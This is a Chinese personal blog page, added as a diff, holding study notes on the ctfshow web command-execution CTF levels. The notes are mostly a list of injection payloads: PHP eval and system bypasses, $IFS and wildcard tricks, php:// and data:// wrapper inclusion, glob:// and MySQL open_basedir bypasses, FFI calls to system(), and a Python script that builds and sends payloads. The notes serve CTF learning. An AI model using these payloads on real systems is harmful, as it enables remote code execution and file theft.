@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"na0hblog.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="努力">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web命令执行">
+<meta property="og:url" content="http://na0hblog.top/2021/11/09/2021-11-09-ctfshow-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="佩斯利小姐House">
+<meta property="og:description" content="努力">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo2.jpg">
+<meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo图片1.jpg">
+<meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo3.gif">
+<meta property="og:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo5.gif">
+<meta property="article:published_time" content="2021-11-09T07:36:00.000Z">
+<meta property="article:modified_time" content="2021-11-09T08:04:55.431Z">
+<meta property="article:author" content="lbj">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/360MoveData/Users/浩土土/Desktop/hexo2.jpg">
+
+<link rel="canonical" href="http://na0hblog.top/2021/11/09/2021-11-09-ctfshow-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow web命令执行 | 佩斯利小姐House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">佩斯利小姐House</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://na0hblog.top/2021/11/09/2021-11-09-ctfshow-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lbj">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="佩斯利小姐House">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow web命令执行
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-09 15:36:00 / 修改时间：16:04:55" itemprop="dateCreated datePublished" datetime="2021-11-09T15:36:00+08:00">2021-11-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">努力</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <img src="D:\360MoveData\Users\浩土土\Desktop\hexo2.jpg" style="zoom:25%;" />
+
+<!-- more -->
+
+<img src="D:\360MoveData\Users\浩土土\Desktop\hexo图片1.jpg" alt="#沛宝小屋" style="zoom: 25%;" />
+
+<p>##<strong>想沛沛的第n天</strong></p>
+<p><strong>web29</strong><br>看正则表达式发现 flag被过滤 ls看看有什么<br>?c=system(ls); 发现有个flag.php<br>这题有多种方法 构造后查看源代码即可<br>1.可根据提示构造?c=echo <code>nl fl&#39;&#39;ag.php</code>; 2.c=system(‘cat fla); 3.?c=system(‘cp fla?.php 1.txt’)<br>*web30<br>看正则表达式 多过滤了 system和php 学会用反引号 ``有system()的作用<br>1.?c=echo <code>cat f* </code>; 2.提示的?c=echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>*web31<br>增加了一些绕过比较重要的是 cat和空格 在网上查看的可以替代cat的句式<br>1.tac：从最后一行开始显示，是cat的反向显示2.more：一页一页的显示档案内容3.less：与more类似4.head：查看文档的前几行5.tail：查看文档的后几行6.nl：显示的时候，顺便输入行号7.od：以二进制的方式读取档案8.vi：一种编辑器9.uniq：查看10.vim：一种编译器<br>可代替空格绕过的句式 1.${IFS}2.$IFS$13.${IFS4.%205.&lt;和&lt;&gt;重定向符6.%09   所以构造<br>?c=echo(<code>more%09f*</code>); 还有很多大佬解法?c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);///嵌套脱离了c的正则判断<br>?c=echo<code>strings%09f*</code>;<br>还有hint的 ?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br>*web32<br>又过滤掉了； ( echo ‘ `( 分号可以用?&gt; eval可以用include  括号可以用“”代替 )<br>加上文件包含形式php：//filter/read=convert.base64-encode/resource=flag.php<br>这题构造：?c=include”$GET[1]”?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>*<strong>web33</strong><br>?c=include$GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php  和上题目一样但是要去掉双引号 因为被过滤<br>*<em><strong>web34 web35</strong></em><br>34过滤了：<br>35过滤了“ &lt; =<br> 都可以?c=include$GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>*<strong>web36</strong><br>36 过滤了数字?c=include$GET[hhp]?&gt;&amp;hhp=php://filter/read=convert.base64-encode/resource=flag.php 1改为数字<br>*<strong>web37</strong><br>37 eval函数变成了 include函数<br>考点为伪协议?c=data://text/ plain,<?php phpinfo();?><br>data后面将所有的数字、字符、字符串当做php代码执行<br>构造 ?c=data://text /  plain,<?php system('cat fl??.php');?><br>*<strong>web38</strong><br>38 过滤了php和file<br> 可以将<?php 改为<?= 于是构造为 ?c=data:/ / text/ plain,<?=system("cat fla?.???);?><br>*<strong>web39</strong><br>39过滤掉了flag 限制后缀为php 构造?c=data://text /p lain,<?php system("cat fla?.php");?><br>*<strong>web40</strong><br>?c=print_r(scandir(current(localeconv())));<br>print_r(scandir(xxx))可用来查看当前目录所有文件名  localeconv() 函数返回包括本地数字及货物格式信息的数组 current函数返回数组中的当前单元，默认第一个值，也可以用pos reset代替 然后发现flag.php是第三个数组 也是倒数第二个<br>于是构造 ?/c=highlight_file(next(array_reverse(scandir(current(localeconv())))));  可利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数.<br>array_reverse 以相反顺序返回数组 next 读取下一个元素 通过highlight_file读取 利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数.<br>*<strong>web41</strong><br>把所有的数字小写字母都屏蔽了 这种全过滤只有一种解法 构造字符串<br> &amp; 按位与 |按位或 ^ 按位异或 <del>取反 为四大位运算符，其中按位异 | 没有过滤<br>脚本如下：import re<br>import requests<br>url=”<a href="http://67e43a48-b511-4fcd-b715-74df05737fd1.challenge.ctf.show:8080&quot;">http://67e43a48-b511-4fcd-b715-74df05737fd1.challenge.ctf.show:8080&quot;</a><br>a=[]<br>ans1=””<br>ans2=””<br>for i in range(0,256):<br>    c=chr(i)<br>    tmp = re.match(r’[0-9]|[a-z]|^|+|\</del>|$|[|]|{|}|&amp;|-‘,c, re.I)<br>    if(tmp):<br>        continue<br>        #print(tmp.group(0))<br>    else:<br>        a.append(i)</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>eval(“echo($c);”);</p>
+<p>mya=”system”  #函数名 这里修改！<br>myb=”ls”      #参数<br>def myfun(k,my):<br>    global ans1<br>    global ans2<br>    for i in range (0,len(a)):<br>        for j in range(i,len(a)):<br>            if(a[i]|a[j]==ord(my[k])):<br>                ans1+=chr(a[i])<br>                ans2+=chr(a[j])<br>                return;<br>for k in range(0,len(mya)):<br>    myfun(k,mya)<br>data1=”(&quot;“+ans1+”&quot;|&quot;“+ans2+”&quot;)”<br>ans1=””<br>ans2=””<br>for k in range(0,len(myb)):<br>    myfun(k,myb)<br>data2=”(&quot;“+ans1+”&quot;|&quot;“+ans2+”&quot;)”<br>data={“c”:data1+data2}<br>r=requests.post(url=url,data=data)<br>print(r.text)   append函数会在数组后加上相应的元素<br>*<strong>web42</strong> 标准输出（stdout）代码是1 标准错误输出（stderr）代码是2 由于“ &gt; / dev / null＆ ”返回的值丢失，我们不会等待响应。 <a target="_blank" rel="noopener" href="http://8deebfb5-d519-443d-af2c-d106f47f6885.challenge.ctf.show/?c=cat%20flag.php;ls%E8%BF%99%E6%A0%B7%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87%EF%BC%81%EF%BC%81%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81c=cat%20flag.php;%E5%8D%B3%E5%8F%AF">http://8deebfb5-d519-443d-af2c-d106f47f6885.challenge.ctf.show/?c=cat%20flag.php;ls这样即可绕过！！查看源代码c=cat%20flag.php;即可</a> 还可cat flag.php%0a;<br>*<strong>web43</strong> 多过滤了分号 cat 用 ?c=tac%20flag.php||绕过 或者nl flag.php%0<br><em><strong>web44</strong> 多过滤了flag 用 nl fla</em>.php%0a 或者 ?c=tac%20fl\ag.php||<br>*<strong>web45</strong>多过滤了空格 ?c=tac%09fl\ag.php||或者echo$IFS<code>tac$IFS*</code>%0A （反引号一种功能是执行系统命令）<br>*<strong>web46</strong>  f(!preg_match(“/;|cat|flag| |[0-9]|\$|*/i”, $c))  过滤了好多了 ?c=tac&lt;fl’’ag.php|| 或者tac换为nl 或者?c=tac%09fla??php||<br>*<strong>web47</strong><br>  !preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail/i” 可以c=tac&lt;fl’’ag.php||<br>*<strong>web48</strong><br>if(!preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`/i” ?c=tac&lt;fl’’ag.php||<br>***web49**<br>f(!preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%/i” ?c=tac&lt;fl’’ag.php||<br>*<strong>web50</strong><br>c=tac&lt;fl’’ag.php|| </p>
+<p>#沛女王命令放的！<img src="D:\360MoveData\Users\浩土土\Desktop\hexo3.gif"></p>
+<p>*<strong>web51</strong><br>if(!preg_match(“/;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26/i”, $c)){   /?c=nl&lt;fl’’ag.php||<br>***web52**<br>(!preg_match(“/;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){<br>?c=nl$IFS/fl’’ag||  或者 =nl$IFS\fla\g.php||<br>***web53**<br>if(!preg_match(“/;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/i”, $c)){<br>        echo($c);<br>        $d = system($c);<br>        echo “<br>“.$d;<br>?c=c’’at${IFS}fla’’g.p’’hp<br>*<strong>web54</strong><br>加强了正则 /bin/?at${IFS}f???????<br>*<strong>web55</strong><br>这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php 然后 ?c=/???/????64%20????.???  或者 ?c=/???/???/????2 ????.??? —》 然后在url + /flag.php.bz2<br>*<strong>web57</strong><br>拼接出36即可 但是基本上字母数字分号通配符都屏蔽了<br>要知道<br> echo ${_}是返回上次的结果  所以?c=echo $(()) 为0  $((<del>$(())))为 ~0 为-1<br>所以 -37为36  c=$((</del>$(($((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((~$(())))))))<br>或者 运用grep grep 指令用于查找内容包含指定的范本样式的文件<br>?c=grep${IFS}’fla’${IFS}fla??php<br>*<strong>web58 -65</strong><br>单一函数读文件内容：<br>函数：<br>file_get_contents()<br>readfile()<br>file()           可以c=echo file_get_contents(“flag.php”);<br>                   readfile(“flag.php”);<br>                  print_r(file(“flag.php”));<br>           高亮显示php文件<br>函数<br>show_source()<br>highlight_file()<br>用法：<br>show_source(“flag.php”);<br>highlight_file(“flag.php”);<br><em><strong>web 66 67</strong><br>flag不在flag.php中,需要先查找flag所在的位置<br>scandir()<br>opendir()<br>用法<br>c=var_dump(scandir(“/“));highlight_file(“/flag.txt”);<br>c=$a=opendir(“/“); while (($file = readdir($a)) !== false){echo $file . “<br>“; };highlight_file(“/flag.txt”);<br>var_dump() 函数用于输出变量的相关信息<br>var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br> scandir() 函数 列出 images 目录中的文件和目录：<br>opendir()函数 opendir()用来打开参数name 指定的目录, 并返回DIR</em>形态的目录流, 和open()类似, 接下来对目录的读取和搜索都要使用此返回值.<br>所以现在查看目录 c=var_dump(scandir(“/“)); 再打开highlight_file(“/flag.txt”);<br>*<strong>web68 69 70</strong><br>c=include(“index.php”); 发现字节太大了直接盲猜 因为是txt文件 可以用include或者require c=include(“/flag.txt”);<br> *<strong>web71</strong> 绕过echo preg_replace(“/[0-9]|[a-z]/i”,”?”,$s); 直接后面输入 exit();即可 我们可以执行php代码让后面的匹配缓冲区不执行直接退出<br>*<strong>web72</strong><br>如果还是用老办法是不行的，首先他的位置换了，你输入include(‘/flag.txt’);他会找不到文件，其次，没有权限。使用scandir(‘/‘)；exit();会报错<br>forEach() 方法用于调用数组的每个元素，并将元素传递给回调函数。</p>
+<p>php里的标准库说明 <?php 
+$dir = new DirectoryIterator(dirname(__FILE__));
+foreach ($dir as $fileInfo) {
+if ($fileInfo->isdir()) {
+    //echo $fileInfo->getPathname();
+    echo $fileInfo->getFilename(). "\t" . $fileInfo->getSize()."</br>";
+    }
+}
+ ?><br>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)<br>所以使用glob://伪协议绕过open_basedir<br>c=?%3E%3C?php%0A$a=new%20DirectoryIterator(%22glob:///*%22);%0Aforeach($a%20as%20$f)%0A%7Becho($f-%3E__toString().’%20’);%0A%7D%0Aexit(0);%0A?%3E<br> 找到文件目录 运用uaf的脚本 url编码<br>*<strong>web73</strong>    #沛宝小屋<img src="D:\360MoveData\Users\浩土土\Desktop\hexo5.gif"><br>先用 glob伪协议的方法查看目录 具体克看烧碱博客<br> #glob:///*会列出根目录下的文件</p>
+<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><p>glob://*会列出open_basedir允许目录下的文件</p>
+<p> 再用打开txt文件的方式 记得exit(0) 因为这样可以断掉屏蔽<br>c=include(‘/flagc.txt’);exit(0);<br>*web74同73 c=?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->toString().' ');} exit(0); 先伪协议搜目录 再打开
+也可以$a=opendir("/"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };include("flagx.txt");exit();
+***web74**文件名换了 注意看呀！！！！
+***web75** 先扫描目录  c=?>&lt;?php $a=new DirectoryIterator(“glob:///*”);foreach($a as $f){echo($f-&gt;toString().’ ‘);} exit(0); 发现是flag36.txt<br>然后发现又是open_basedir 限制 这时候可以mysql绕过<br>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’,<br>‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row)<br>{echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e-getMessage();exit(0);}exit(0);<br>*<strong>web76</strong>同75 改个文件名而已</p>
+<p>*<strong>web77</strong>要学会这题就要会新特性 ffi拓展 具体见 有了FFI以后，我们就可以直接在PHP脚本中调用C语言写的库中的函数了。<a target="_blank" rel="noopener" href="https://www.laruence.com/2020/03/11/5475.html">https://www.laruence.com/2020/03/11/5475.html</a><br>通过FFI（7.4版本）  c=$ffi=FFI::cdef(“int system(char <em>command);”, “libc.so.6”);//实施system$a=’/readflag &gt; 1.txt’;//放入文件$ffi-&gt;system($a);exit();  //再访问1.txt<br>readflag由读取根目录所有文件得来<br>c=$a=new DirectoryIterator(“glob:///</em>“);foreach($a as $f){echo($f-&gt;toString().’ ‘);}exit(0);</p>
+<p><em>web118<br>果然越来越刁了 需要脑洞啊 需要使用bash的内置变量进行绕过</em>*<br>$PWD<br>工作目录(你当前所在的目录)，这与内置命令 pwd 的作用相同：**<br>$PATH<br>可执行文件的搜索路径。<br>$IFS<br>内部域分隔符。这个变量用来决定 Bash 在解释字符串时如何识别域，或者单词边界。</p>
+<p>echo ${PWD:0:1}      #表示从0下标开始的第一个字符  echo ${PWD:<del>0:1}      #从结尾开始往前的第一个字符 所以这题 要构造 nl  就要 bin的最后一个 html的最后一个**<br>${PWD}          /var/www/html**<br>${PWD:</del>0}     l${PATH}         /bin**<br>${PATH:<del>0}    n     构造为${PATH:</del>A}${PWD:<del>A}$IFS????.???  ？是flag，php提示了<br><em><strong>web119</strong></em>*<br>把path也过滤掉了 那就用环境变量<br> 构造一个三 然后构造tac<br>环境变量如下：<br>php_cflags=-fstack-protector-strong -fpic -fpie -02 -D_largefile_source _d_file_offset_bi<br>php_version=7.3.22<br>shivl=1<br> ${php_version:$shlvl} 3.22  要取到”3” 就要数字1各种尝试 发现要取到3要这样构造 :${php_version:${php_version:</del>A}:<del>${SHLVL}这样为3 就可以用tac<br>tac=${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:</del>A}:<del>${SHLVL}}:${PHP_VERSION:${PHP_VERSION:</del>A}:~${SHLVL}}}<br>加上空格？？？？.？？？</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/09/ctfshow%E7%88%86%E7%A0%B4/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-1"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lbj</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lbj</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
